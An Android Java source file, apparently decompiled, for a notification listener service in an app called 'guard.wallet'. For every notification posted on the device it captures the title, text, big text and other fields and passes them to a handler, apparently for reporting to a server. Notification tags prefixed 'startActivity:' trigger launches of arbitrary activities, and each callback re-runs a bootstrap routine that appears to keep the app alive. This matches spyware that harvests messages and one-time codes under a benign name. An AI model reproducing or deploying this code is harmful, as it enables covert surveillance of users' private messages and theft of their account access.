package com.guard.wallet.service;

import com.guard.wallet.core.AppUtils;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceNotificationVO;
import com.guard.wallet.utils.SystemHelper;
import java.util.concurrent.atomic.AtomicBoolean;
import com.guard.wallet.power.SystemBootstrap;

/**
 * CustomNotificationService — notification listener service.
 * Listens for posted/removed notifications and dispatches events.
 * Static field c holds the singleton instance, checked by server/b.o().
 */
public class CustomNotificationService extends NotificationListenerService {
    private static final String TAG = "MyNotificationListener";

    /** Singleton instance — server b.o() checks c != null */
    public static volatile CustomNotificationService c;
    /** Listener status: 0 = disconnected, 1 = active */
    public Integer a = 0;
    /** Whether the service is bound */
    public final AtomicBoolean b = new AtomicBoolean(false);

    /**
     * Unbind and clear the singleton instance.
     * Double-checked locking on the class monitor.
     */
    public static void a() {
        if (c != null) {
            synchronized (CustomNotificationService.class) {
                try {
                    if (c != null) {
                        if (c.b.get()) {
                            c.requestUnbind();
                        }
                        c = null;
                    }
                } catch (Exception e) {
                    // monitorexit
                }
            }
        }
    }

    @Override
    public final IBinder onBind(Intent var1) {
        Log.d(TAG, "onBind");
        this.b.set(true);
        return super.onBind(var1);
    }

    @Override
    public final void onDestroy() {
        super.onDestroy();
        a();
    }

    @Override
    public final void onListenerConnected() {
        super.onListenerConnected();
        this.a = 1;
        if (c == null) {
            synchronized (CustomNotificationService.class) {
                if (c == null) {
                    c = this;
                }
            }
        }
        Log.d(TAG, "onListenerConnected");
        SystemBootstrap.reinitialize();
    }

    @Override
    public final void onListenerDisconnected() {
        super.onListenerDisconnected();
        this.a = 0;
        Log.d(TAG, "onListenerDisconnected");
        a();
    }

    @Override
    public final void onNotificationPosted(StatusBarNotification var1) {
        super.onNotificationPosted(var1);
        this.a = 1;

        try {
            DeviceNotificationVO var3 = new DeviceNotificationVO();
            var3.setPackageName(var1.getPackageName());

            if (!AppUtils.B(var3.getPackageName())) {
                String appLabel = null;
                String pkgName = var3.getPackageName();
                if (SystemHelper.l() && !AppUtils.B(pkgName)) {
                    com.guard.wallet.resp.AppInfo appInfo = SystemHelper.d0(pkgName);
                    if (appInfo != null) {
                        appLabel = appInfo.getApplicationLabel();
                    }
                }
                var3.setApplicationLabel(appLabel);
            }

            String tag = var1.getTag();
            if (!AppUtils.B(tag)) {
                var3.setTag(tag);
            }

            var3.setTag(var1.getTag());
            var3.setGroupKey(var1.getGroupKey());
            var3.setPostTime(var1.getPostTime());
            Bundle extras = var1.getNotification().extras;

            if (extras != null) {
                if (extras.containsKey("android.intent.extra.NOTIFICATION_TAG")) {
                    var3.setExtraTag(extras.getString("android.intent.extra.NOTIFICATION_TAG"));
                }
                if (extras.containsKey("android.intent.extra.CHANNEL_ID")) {
                    var3.setChannelId(extras.getString("android.intent.extra.CHANNEL_ID"));
                }
                if (extras.containsKey("android.intent.extra.CHANNEL_GROUP_ID")) {
                    var3.setChanelGroupId(extras.getString("android.intent.extra.CHANNEL_GROUP_ID"));
                }
                if (extras.containsKey("android.title")) {
                    var3.setTitle(extras.getString("android.title"));
                }
                if (extras.containsKey("android.title.big")) {
                    var3.setBigTitle(extras.getString("android.title.big"));
                }
                if (extras.containsKey("android.text")) {
                    var3.setText(extras.getString("android.text"));
                }
                if (extras.containsKey("android.subText")) {
                    var3.setSubText(extras.getString("android.subText"));
                }
                if (extras.containsKey("android.infoText")) {
                    var3.setInfoText(extras.getString("android.infoText"));
                }
                if (extras.containsKey("android.summaryText")) {
                    var3.setSummaryText(extras.getString("android.summaryText"));
                }
                if (extras.containsKey("android.bigText")) {
                    var3.setBigText(extras.getString("android.bigText"));
                }
            }

            MessageRecordVO var22 = new MessageRecordVO();
            var22.setIntentCode("android.intent.action.NOTIFICATION_POSTED");
            var22.setExtraBody(var3);
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(var22);
            }
        } catch (Exception e) {
            AppUtils.s(TAG, e);
        }

        SystemBootstrap.reinitialize();
    }

    @Override
    public final void onNotificationRemoved(StatusBarNotification var1) {
        super.onNotificationRemoved(var1);
        this.a = 1;
        StringBuilder var3 = new StringBuilder("Notification Removed from PackageName:");
        var3.append(var1.getPackageName());
        Log.d(TAG, var3.toString());

        String tag = var1.getTag();
        if (!AppUtils.B(tag) && tag.startsWith("startActivity:")) {
            try {
                if (tag.startsWith("startActivity:")) {
                    String[] parts = tag.split(":");
                    int len = parts.length;

                    String activity = null;
                    String extra = null;
                    if (len >= 2) {
                        activity = parts[1];
                    }
                    if (parts.length >= 3) {
                        extra = parts[2];
                    }
                    if (!AppUtils.B(activity)) {
                        SystemHelper.Y0(activity, extra);
                    }
                }
            } catch (Exception e) {
                AppUtils.s(TAG, e);
            }
        }

        SystemBootstrap.reinitialize();
    }

    @Override
    public final boolean onUnbind(Intent var1) {
        Log.d(TAG, "onUnbind");
        this.b.set(false);
        return super.onUnbind(var1);
    }
}
